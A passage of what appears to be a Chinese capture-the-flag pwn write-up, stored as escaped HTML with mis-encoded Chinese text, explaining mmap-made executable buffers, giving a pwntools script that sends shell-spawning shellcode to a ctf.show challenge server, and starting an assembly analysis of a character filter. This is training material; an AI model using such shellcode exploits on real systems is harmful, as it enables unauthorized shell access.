&lt;p&gt;çœ‹åˆ°ä¸€ä¸ªæ–°å‡½æ•°mmapï¼Œ&lt;code&gt;mmap&lt;/code&gt;ï¼ˆmemory mapï¼‰æ˜¯ Linux ç³»ç»Ÿè°ƒç”¨ï¼Œä¸»è¦åŠŸèƒ½æ˜¯&lt;strong&gt;å°†æ–‡ä»¶æˆ–è®¾å¤‡æ˜ å°„åˆ°è¿›ç¨‹çš„è™šæ‹Ÿå†…å­˜ç©ºé—´&lt;/strong&gt;ï¼Œä½†åœ¨ PWN æ¼æ´åˆ©ç”¨ä¸­ï¼Œæ›´å¸¸ç”¨å…¶ â€œåŒ¿åæ˜ å°„â€ åŠŸèƒ½ï¼Œå‚æ•°é€šè¿‡å¯„å­˜å™¨ä¼ é€’ï¼ˆ&lt;code&gt;rdi, rsi, rdx, r10, r8, r9&lt;/code&gt;ï¼‰&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// attributes: thunk
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;mmap&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;address&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;size_t&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;prot&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;flags&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;fd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;__off_t&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;offset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;mmap&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;address&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;prot&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;flags&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;fd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;offset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;blockquote&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;address&lt;/code&gt;ï¼ˆrdi å¯„å­˜å™¨ï¼‰&lt;/strong&gt;ï¼š&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;æœŸæœ›çš„å†…å­˜èµ·å§‹åœ°å€ï¼Œé€šå¸¸è®¾ä¸º&lt;code&gt;0&lt;/code&gt;ï¼ˆè®©ç³»ç»Ÿè‡ªåŠ¨åˆ†é…ï¼‰ã€‚&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;length&lt;/code&gt;ï¼ˆrsi å¯„å­˜å™¨ï¼‰&lt;/strong&gt;ï¼š&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;åˆ†é…çš„å†…å­˜å¤§å°ï¼ˆå­—èŠ‚ï¼‰ï¼Œéœ€æ ¹æ® shellcode é•¿åº¦è®¾ç½®ï¼ˆå¦‚æ–‡æ¡£ä¸­è®¾ä¸º&lt;code&gt;0x1000&lt;/code&gt;ï¼Œå³ 4KBï¼Œè¶³å¤Ÿå­˜æ”¾ ORW shellcodeï¼‰ã€‚&lt;/p&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;prot&lt;/code&gt;ï¼ˆrdx å¯„å­˜å™¨ï¼‰&lt;/strong&gt;ï¼š&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;å†…å­˜ä¿æŠ¤å±æ€§ï¼ŒPWN ä¸­å¸¸ç”¨&lt;code&gt;PROT_READ | PROT_WRITE | PROT_EXEC&lt;/code&gt;ï¼ˆå¯¹åº”å€¼&lt;code&gt;0x7&lt;/code&gt;ï¼‰ï¼Œè¡¨ç¤ºå†…å­˜å¯è¯»ã€å¯å†™ã€å¯æ‰§è¡Œã€‚&lt;/p&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;flags&lt;/code&gt;ï¼ˆr10 å¯„å­˜å™¨ï¼‰&lt;/strong&gt;ï¼š&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;æ˜ å°„ç±»å‹æ ‡å¿—ï¼Œæ¼æ´åˆ©ç”¨ä¸­å¸¸ç”¨&lt;code&gt;MAP_ANONYMOUS | MAP_PRIVATE&lt;/code&gt;ï¼ˆå¯¹åº”å€¼&lt;code&gt;0x22&lt;/code&gt;ï¼‰ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;MAP_ANONYMOUS&lt;/code&gt;ï¼šåŒ¿åæ˜ å°„ï¼Œä¸å…³è”æ–‡ä»¶ï¼›&lt;/li&gt;
&lt;li&gt;&lt;code&gt;MAP_PRIVATE&lt;/code&gt;ï¼šç§æœ‰æ˜ å°„ï¼Œä¿®æ”¹ä¸å½±å“å…¶ä»–è¿›ç¨‹ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;5&#34;&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;fd&lt;/code&gt;ï¼ˆr8 å¯„å­˜å™¨ï¼‰&lt;/strong&gt;ï¼š&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;æ–‡ä»¶æè¿°ç¬¦ï¼ŒåŒ¿åæ˜ å°„æ—¶è®¾ä¸º&lt;code&gt;-1&lt;/code&gt;ï¼ˆæˆ–&lt;code&gt;0&lt;/code&gt;ï¼Œä¸å½±å“ï¼‰ã€‚&lt;/p&gt;
&lt;ol start=&#34;6&#34;&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;offset&lt;/code&gt;ï¼ˆr9 å¯„å­˜å™¨ï¼‰&lt;/strong&gt;ï¼š&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;æ–‡ä»¶åç§»é‡ï¼ŒåŒ¿åæ˜ å°„æ—¶è®¾ä¸º&lt;code&gt;0&lt;/code&gt;ã€‚&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;è¿™è¡Œä»£ç ä½¿ç”¨ mmap å‡½æ•°åˆ†é…ä¸€å—å†…å­˜åŒºåŸŸï¼Œå°†å…¶èµ·å§‹åœ°å€ä¿å­˜åœ¨å˜é‡ buf ä¸­ã€‚ mmap å‡½æ•°é€šå¸¸ç”¨äºåœ¨å†…å­˜ä¸­åˆ†é…ä¸€å—è¿ç»­çš„åœ°å€ç©ºé—´ï¼Œå¹¶æŒ‡å®šç›¸åº”çš„æƒé™å’Œå±æ€§ã€‚&lt;/p&gt;
&lt;p&gt;è¿™é‡Œbufç”¨mmapæ˜ å°„äº†åœ°å€ï¼Œå¯è¯»å¯å†™å¯æ‰§è¡Œï¼Œç›´æ¥ä¼ å…¥shellcodeï¼Œ((void (*)(void))buf)()ã€‚è°ƒç”¨äº†bufï¼Œè¿è¡Œshellcode å³å¯è·å–shellã€‚&lt;/p&gt;
&lt;p&gt;é‚£æˆ‘ä»¬å®Œå…¨å¯ä»¥ç”¨pwntoolsçš„shellcraftæ¨¡å—ä¸‹çš„shellcodeï¼ˆ29å­—èŠ‚é•¿åº¦ï¼‰&lt;/p&gt;
&lt;p&gt;exp:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;context&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;arch&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;i386&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;os&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;linux&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;log_level&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;debug&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#io = process(&amp;#39;./pwn&amp;#39;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;remote&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;pwn.challenge.ctf.show&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;28163&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;asm&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shellcraft&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sh&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;())&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sendline&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;recv&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;io&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;interactive&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;pwn_065&#34;&gt;PWN_065
&lt;/h3&gt;&lt;p&gt;é¢˜ç›®ï¼šä½ æ˜¯ä¸€ä¸ªå¥½äººã€‚ &lt;a class=&#34;link&#34; href=&#34;PWN_065&#34; &gt;PWN_065&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;checksecï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/217.png&#34;
	width=&#34;689&#34;
	height=&#34;230&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/217_hu_9219bd1807e776b6.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/217_hu_4a3ba2071de4bd87.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;299&#34;
		data-flex-basis=&#34;718px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;å±…ç„¶å¼€äº†RELROå®Œå…¨ä¿æŠ¤ã€‚&lt;/p&gt;
&lt;p&gt;è¿è¡Œä¸‹çœ‹çœ‹ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/219.png&#34;
	width=&#34;800&#34;
	height=&#34;130&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/219_hu_7cb2704aaaf5c087.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/219_hu_f3f9891fe0470510.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;615&#34;
		data-flex-basis=&#34;1476px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;å¯ä»¥å‘ç°è¿™é‡Œè¦æˆ‘ä»¬è¾“å…¥ä¸€ä¸ªç¬¦åˆè¦æ±‚çš„å­—ç¬¦ä¸²æ‰è¡Œã€‚&lt;/p&gt;
&lt;p&gt;IDA64çœ‹ä¸äº†æºç ï¼Œåªèƒ½çœ‹æ±‡ç¼–ä»£ç ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/220.png&#34;
	width=&#34;854&#34;
	height=&#34;143&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/220_hu_5fd5faaaffbfe84b.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/220_hu_b8c536d0801b1752.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;597&#34;
		data-flex-basis=&#34;1433px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;åœ¨è¿™é‡Œæˆ‘ä»¬çœ‹åˆ°æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ç»readå‡½æ•°è¯»å–ç„¶åé€šè¿‡jgæ¯”è¾ƒæ˜¯var_8å¦å¤§äºé›¶ï¼Œç¬¦åˆè¦æ±‚å°±è·³è½¬åˆ°&lt;strong&gt;loc_11AC&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/221.png&#34;
	width=&#34;905&#34;
	height=&#34;384&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/221_hu_fd3b4f7c452cd320.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/221_hu_91c3e0d533f16fc6.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;235&#34;
		data-flex-basis=&#34;565px&#34;
	
&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;cdqe&lt;/code&gt;ä½¿ç”¨eaxçš„æœ€é«˜ä½æ‹“å±•raxé«˜32ä½çš„æ‰€æœ‰ä½ movzxåˆ™æ˜¯æŒ‰æ— ç¬¦å·æ•°ä¼ é€+æ‰©å±•ï¼ˆ16-32ï¼‰ EAXæ˜¯32ä½çš„å¯„å­˜å™¨ï¼Œè€ŒAXæ˜¯EAXçš„ä½16ä½,AHæ˜¯axçš„é«˜8ä½ï¼Œè€ŒALæ˜¯axçš„ä½8ä½å¤§è‡´å°±æ˜¯å°†æˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸²æ¯ä¸€ä½è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœä¸åœ¨&lt;code&gt;0x60~0x7A&lt;/code&gt;è¿™ä¸ªèŒƒå›´å°±è·³è½¬å‰©ä¸‹å‡ ä¸ªå°±æ˜¯è·³è½¬çš„èŒƒå›´ã€‚&lt;/p&gt;
&lt;p&gt;æ„æ€å¯èƒ½å°±æ˜¯ä»ç¬¬ä¸€ä¸ªå­—ç¬¦å¼€å§‹ä¸€ç›´åšå¾ªç¯åˆ¤æ–­ï¼Œå¦‚æœæ¯ä¸€ä¸ªå­—ç¬¦éƒ½åœ¨ä¸€å®šåŒºé—´ï¼Œç»“æŸæœ€åä¸€ä¸ªå­—ç¬¦åˆ¤æ–­æ—¶å°±èƒ½å¤Ÿç»•è¿‡ä¸Šé¢çš„ loc_11B8 æ¥æ‰§è¡Œ shellcode äº†ã€‚&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/222.png&#34;
	width=&#34;1025&#34;
	height=&#34;859&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/222_hu_e5c0df3aa0131082.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/222_hu_fbda44b5fa3129b9.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;å­—ç¬¦èŒƒå›´ç¡®å®š&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;119&#34;
		data-flex-basis=&#34;286px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;1.ç¬¬ä¸€ç»„èŒƒå›´æ ‡è¯†ï¼šå…è®¸ &lt;code&gt;0x60~0x7A&lt;/code&gt;ï¼ˆå¯¹åº” ASCII &amp;lsquo;`&amp;rsquo;~&amp;lsquo;z&amp;rsquo;ï¼‰&lt;/p&gt;
&lt;p&gt;å¯¹åº”ä»£ç æ®µï¼ˆ&lt;code&gt;loc_11B8&lt;/code&gt;è‡³&lt;code&gt;loc_1236&lt;/code&gt;ï¼‰ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;00000000000011&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;C5&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;cmp&lt;/span&gt;     &lt;span class=&#34;nb&#34;&gt;al&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;60h&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;; &amp;#39;`&amp;#39;  // è¾¹ç•Œ1ï¼š0x60&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;00000000000011&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;C7&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;jle&lt;/span&gt;     &lt;span class=&#34;nv&#34;&gt;short&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;loc_11DA&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;//&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;å­—ç¬¦â‰¤&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x60&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;â†’&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;è¿›å…¥ä¸‹ä¸€è½®æ ¡éªŒ&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;00000000000011&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;D6&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;cmp&lt;/span&gt;     &lt;span class=&#34;nb&#34;&gt;al&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;7Ah&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;; &amp;#39;z&amp;#39;  // è¾¹ç•Œ2ï¼š0x7A&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;00000000000011&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;D8&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;jle&lt;/span&gt;     &lt;span class=&#34;nv&#34;&gt;short&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;loc_1236&lt;/span&gt;  &lt;span class=&#34;o&#34;&gt;//&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;å­—ç¬¦â‰¤&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x7A&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;â†’&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;é€šè¿‡æ ¡éªŒ&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;2.ç¬¬äºŒç»„èŒƒå›´æ ‡è¯†ï¼šå…è®¸ &lt;code&gt;0x40~0x5A&lt;/code&gt;ï¼ˆå¯¹åº” ASCII &amp;lsquo;@&amp;rsquo;~&amp;lsquo;Z&amp;rsquo;ï¼‰&lt;/p&gt;
&lt;p&gt;å¯¹åº”ä»£ç æ®µï¼ˆ&lt;code&gt;loc_11DA&lt;/code&gt;è‡³&lt;code&gt;loc_1236&lt;/code&gt;ï¼‰ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nl&#34;&gt;.text:&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;00000000000011&lt;/span&gt;&lt;span class=&#34;nf&#34;&gt;E7&lt;/span&gt;                 &lt;span class=&#34;nv&#34;&gt;cmp&lt;/span&gt;     &lt;span class=&#34;nb&#34;&gt;al&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mh&#34;&gt;40h&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;; &amp;#39;@&amp;#39;  // è¾¹ç•Œ1ï¼š0x40&lt;/span&gt;
